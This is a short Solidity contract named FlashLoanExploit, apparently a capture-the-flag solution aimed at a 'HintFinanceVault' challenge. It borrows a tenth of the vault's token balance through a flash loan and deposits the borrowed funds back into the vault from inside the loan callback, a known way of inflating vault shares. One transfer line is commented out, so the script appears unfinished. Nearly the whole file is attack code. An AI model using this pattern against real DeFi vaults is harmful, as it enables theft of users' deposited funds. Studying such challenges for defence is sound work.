// SPDX-License-Identifier: VPL

pragma solidity 0.8.16;


import "./HintFinanceVault.sol";
import "./Setup.sol";

contract FlashLoanExploit is IHintFinanceFlashloanReceiver {
  	HintFinanceVault public vault;

	UniswapV2RouterLike private router = UniswapV2RouterLike(
		0xf164fC0Ec4E93095b804a4795bBe1e041497b92a
	);
    address private weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
	address private vaultToken; 

  	constructor(address _vaultAddr) {
      	vault = HintFinanceVault(_vaultAddr);
		vaultToken = vault.underlyingToken();
		ERC20Like(vaultToken).approve(address(vault), (2**256)-1);
  	}

	function hackEet() external {
		vault.flashloan(
			address(vaultToken),
			ERC20Like(vaultToken).balanceOf(address(vault))/10,
			new bytes(0)
		);
	}

    function onHintFinanceFlashloan(
        address token,
        address factory,
        uint256 amount,
        bool isUnderlyingOrReward,
        bytes memory data
	) external {
      	vault.deposit(amount);
		//ERC20Like(vaultToken).transfer(address(vault), amount);
	}

}
